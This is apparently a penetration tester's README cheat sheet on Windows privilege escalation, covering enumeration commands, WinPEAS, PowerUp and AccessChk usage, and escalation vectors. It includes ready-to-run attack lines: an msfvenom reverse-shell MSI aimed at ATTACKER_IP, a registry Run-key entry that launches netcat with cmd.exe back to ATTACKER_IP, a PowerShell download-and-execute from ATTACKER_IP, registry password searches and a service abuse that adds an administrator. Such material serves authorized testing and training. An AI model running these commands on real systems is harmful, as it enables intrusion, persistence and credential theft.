# 07 — Windows Privilege Escalation

## Philosophy

Windows privilege escalation focuses on moving from a **low-privileged user** to a **high-integrity context** such as:

* **Administrator**
* **SYSTEM**
* **Domain Administrator** (in domain environments)

Unlike Linux, Windows security heavily relies on:

* **Access tokens**
* **Service permissions**
* **Registry configuration**
* **Active Directory integration**

Privilege escalation often involves exploiting **misconfigured services, weak permissions, registry misconfigurations, token impersonation, or missing patches**.

The goal is to obtain **SYSTEM-level execution** or administrative control over the host.

---

# Attack Surface Overview

Common Windows privilege escalation vectors:

| Vector                   | Description                                      |
| ------------------------ | ------------------------------------------------ |
| Kernel Exploits          | Vulnerabilities in Windows kernel                |
| Service Misconfiguration | Weak service permissions or writable binaries    |
| Unquoted Service Paths   | Service path interpreted incorrectly             |
| AlwaysInstallElevated    | MSI files executed as SYSTEM                     |
| Scheduled Tasks          | Writable tasks executed as SYSTEM                |
| Startup Folder           | Writable startup execution path                  |
| Token Impersonation      | Abuse of `SeImpersonatePrivilege`                |
| Registry AutoRun         | Malicious program execution                      |
| Credential Hunting       | Passwords in registry, configs, or memory        |
| DLL Hijacking            | Missing DLL loaded from attacker-controlled path |

---

# Windows Privilege Escalation Workflow

```
┌─────────────────────────────────────────────────────────┐
│                Initial Enumeration                       │
│  whoami | systeminfo | net user | ipconfig               │
└──────────────────────────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────┐
│             Automated Enumeration                        │
│  WinPEAS | Seatbelt | PowerUp                            │
└──────────────────────────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────┐
│               Manual Enumeration                         │
│  Services | Registry | Scheduled Tasks                   │
└──────────────────────────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────┐
│                 Exploit Execution                        │
│  Service abuse | Token impersonation | MSI exploit       │
└──────────────────────────────────────────────────────────┘
```

---

# Command Arsenal

## Initial Enumeration (CMD)

### System Information

```cmd
systeminfo
hostname
wmic os get caption,version
wmic computersystem get domain
```

### User Information

```cmd
whoami
whoami /priv
whoami /groups

net user
net user %username%
net localgroup administrators
```

### Network Information

```cmd
ipconfig /all
netstat -ano
arp -a
route print
```

### Processes

```cmd
tasklist /v
tasklist /svc
wmic process list full
```

### File System Enumeration

```cmd
dir C:\
dir "C:\Program Files"
dir "C:\Program Files (x86)"
dir C:\Users
dir /a C:\
```

---

# Initial Enumeration (PowerShell)

### System Information

```powershell
Get-ComputerInfo
Get-WmiObject Win32_OperatingSystem | Select Caption,Version
[Environment]::OSVersion
```

### User Enumeration

```powershell
whoami
Get-LocalUser
Get-LocalGroupMember Administrators
```

### Network Enumeration

```powershell
Get-NetIPConfiguration
Get-NetTCPConnection -State Listen
Get-NetShare
```

### Service Enumeration

```powershell
Get-Service | Where-Object {$_.Status -eq "Running"}
```

---

# Automated Enumeration

Automated scripts quickly identify misconfigurations and potential privilege escalation vectors.

---

## WinPEAS (Primary Tool)

One of the most widely used Windows privilege escalation enumeration tools is
WinPEAS.

### Execute WinPEAS

```cmd
winPEASany.exe quiet cmd fast
```

### Save Results

```cmd
winPEASany.exe quiet cmd fast > winpeas.txt
```

WinPEAS checks for:

* service misconfigurations
* weak file permissions
* registry vulnerabilities
* token privileges
* scheduled task misconfigurations
* credential exposure

---

## Seatbelt

Using
Seatbelt.

```cmd
Seatbelt.exe all
```

---

## PowerUp

PowerShell privilege escalation framework.

```powershell
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

---

# Service Enumeration

### List Services

```cmd
sc query
sc query type= service state= all
```

### Service Paths

```cmd
wmic service get name,displayname,pathname,startmode
```

### Detect Unquoted Service Paths

```cmd
wmic service get name,displayname,pathname,startmode |
findstr /i "auto" |
findstr /i /v "c:\windows\\" |
findstr /i /v """
```

---

# Permission Checks

Using
AccessChk.

```cmd
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```

Check service permissions:

```cmd
accesschk.exe /accepteula -uvqc *
```

---

# AlwaysInstallElevated

Check registry values:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If both return `1`, MSI files run as SYSTEM.

### Generate Payload

Using
Metasploit Framework.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o shell.msi
```

Execute:

```cmd
msiexec /quiet /qn /i shell.msi
```

---

# Scheduled Tasks

List scheduled tasks:

```cmd
schtasks /query /fo LIST /v
```

Look for:

* tasks running as **SYSTEM**
* executables with **weak permissions**

---

# Registry AutoRun

Check auto-execution entries:

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

Add malicious entry:

```cmd
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run \
/v updater \
/t REG_SZ \
/d "C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"
```

---

# Token Impersonation

Check privileges:

```cmd
whoami /priv
```

If present:

```
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
```

Use
PrintSpoofer.

```cmd
PrintSpoofer.exe -i -c cmd.exe
```

Alternative tools:

* JuicyPotato
* RottenPotato

---

# Credential Hunting

### Unattended Installation Files

```cmd
dir /s *unattend* 2>nul
dir /s *sysprep* 2>nul
```

### PowerShell History

```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Saved RDP Connections

```cmd
dir /b /s C:\Users\*\Documents\Default.rdp
```

### Registry Password Search

```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

---

# Deep Enumeration

## PowerUp Exploitation Functions

```powershell
Get-ModifiableServiceFile
Get-ServiceUnquoted
```

Exploit vulnerable service:

```powershell
Install-ServiceBinary -Name "ServiceName" -Command "net localgroup administrators user /add"
```

---

# Kernel Exploits

Save system information:

```cmd
systeminfo > systeminfo.txt
```

Analyze missing patches using:

Windows Exploit Suggester.

```bash
python windows-exploit-suggester.py --systeminfo systeminfo.txt
```

---

# Startup Folder Abuse

Check startup folder permissions:

```cmd
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

If writable, drop a payload to execute on next login.

---

# DLL Hijacking

Steps:

1. Monitor program execution with **Process Monitor**
2. Identify missing DLLs
3. Replace DLL with malicious payload

---

# Automation Techniques

## Full Enumeration Script

```cmd
@echo off
echo [*] Running systeminfo...
systeminfo > systeminfo.txt

echo [*] Running WinPEAS...
winPEASany.exe quiet cmd fast > winpeas.txt

echo [*] Running PowerUp...
powershell -ExecutionPolicy Bypass -Command "Import-Module .\PowerUp.ps1; Invoke-AllChecks" > powerup.txt

echo [*] Enumeration complete
```

---

# PowerShell Remote Enumeration

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')
Invoke-AllChecks
```

---

# Attack Path Prioritization

Typical escalation order:

1. Token impersonation
2. Service misconfiguration
3. AlwaysInstallElevated
4. Scheduled tasks
5. Startup folder
6. DLL hijacking
7. Kernel exploits

---

# Common Mistakes

### Not Checking Token Privileges

Always check:

```cmd
whoami /priv
```

### Ignoring Architecture

Match exploit to system architecture:

* x86
* x64

### Not Using AccessChk

Permission auditing is essential.

### Forgetting UAC

Being in Administrators does not guarantee elevated privileges.

---

# Professional Tips

### Run WinPEAS First

It quickly reveals most escalation vectors.

### Abuse SeImpersonatePrivilege

If present, use **PrintSpoofer** immediately.

### Check Unquoted Service Paths

Often overlooked but very common.

### Enumerate Scheduled Tasks Thoroughly

```cmd
schtasks /query /fo LIST /v
```

---

# Output Organization

```
07-Windows-Privilege-Escalation/

├── README.md
│
├── hosts
│   ├── 192.168.1.10
│   │   ├── systeminfo.txt
│   │   ├── winpeas.txt
│   │   ├── powerup.txt
│   │   ├── services.txt
│   │   └── privesc_notes.txt
│
├── exploits
│   ├── PrintSpoofer.exe
│   ├── JuicyPotato.exe
│   └── MS17-010.exe
│
└── tools
    ├── winPEASany.exe
    ├── PowerUp.ps1
    └── accesschk.exe
```
